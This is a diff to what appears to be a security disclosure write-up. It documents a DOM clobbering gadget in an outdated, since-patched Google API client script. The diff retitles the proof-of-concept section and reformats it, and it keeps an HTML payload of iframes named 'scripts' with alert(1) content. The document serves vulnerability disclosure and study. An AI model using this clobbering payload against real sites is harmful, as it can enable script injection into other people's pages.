@@ -60,7 +60,7 @@ Df = function(a) {
 }
 ```
 
-## PoC
+## More Details
 
 Please note that this gadget has been patched by Google through the release of a newer version: [link](https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.6jI6mC1Equ4.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAQ/rs=AHpOoo-79kMK-M6Si-J0E_6fI_9RBHBrwQ/cb=gapi.loaded_0?le=scs). Therefore, initializing `https://apis.google.com/js/api.js` will load the updated script. To demonstrate the DOM clobbering gadgets, we manually load the vulnerable version here.
 
@@ -69,13 +69,10 @@ Patched Verison
 https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.6jI6mC1Equ4.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAQ/rs=AHpOoo-79kMK-M6Si-J0E_6fI_9RBHBrwQ/cb=gapi.loaded_0?le=scs
 ```
 
-### PoC #1
+### PoC
 ```html
 
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Google API Client Example</title>
+<!--Library-->
   <script>
     // Load the Google API client library
     function loadGapi() {
@@ -106,12 +103,12 @@ https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.6jI6mC1Equ4.O/m=clien
       loadAdditionalScript();
     }
   </script>
-</head>
-<body onload="initialize()">
-  <h1>Google Sheets API Client Example</h1>
-  // PAYLOAD
-  <iframe name="scripts" src="https://apis.google.com/js/api.js">alert(1)</iframe>
-  <iframe name="scripts" src="https://apis.google.com/js/api.js">alert(1)</iframe>
-</body>
-</html>
+
+<body onload="initialize()"></body>
+<!--Library-->
+
+<!--Payload-->
+<iframe name="scripts" src="https://apis.google.com/js/api.js">alert(1)</iframe>
+<iframe name="scripts" src="https://apis.google.com/js/api.js">alert(1)</iframe>
+<!--Payload-->
 ```
